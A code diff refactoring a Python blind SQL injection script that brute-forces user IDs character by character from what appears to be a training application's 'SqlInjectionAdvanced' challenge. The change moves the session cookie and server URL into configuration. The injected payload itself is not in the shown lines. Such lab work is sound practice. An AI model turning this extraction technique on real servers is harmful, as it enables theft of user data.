@@ -1,22 +1,24 @@
 import json
 import requests
+from config.settings import SESSION_COOKIE, SERVER_URL
 
-def find_users(cookie, server_url, table_name, userid_column):
+def find_users(table_name, userid_column):
     """
     Extracts user IDs from a specific table and column.
 
     Args:
-        cookie (str): Session cookie for authentication.
-        server_url (str): The URL of the server to target.
         table_name (str): The table to query.
         userid_column (str): The column holding user IDs.
 
     Returns:
         list: A list of user IDs.
     """
+    if not SESSION_COOKIE or not SERVER_URL:
+        raise ValueError("Server URL or session cookie is not configured in environment settings.")
+
     alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789!@#$%^&*()'
     headers = {
-        'Cookie': cookie,
+        'Cookie': SESSION_COOKIE,
     }
 
     def extract_userid_for_row(row_offset, char_index):
@@ -33,7 +35,7 @@ def find_users(cookie, server_url, table_name, userid_column):
                 'password_reg': 'a',
                 'confirm_password_reg': 'a'
             }
-            r = requests.put(f'{server_url}/SqlInjectionAdvanced/challenge', headers=headers, data=data)
+            r = requests.put(f'{SERVER_URL}/SqlInjectionAdvanced/challenge', headers=headers, data=data)
 
             try:
                 response = json.loads(r.text)
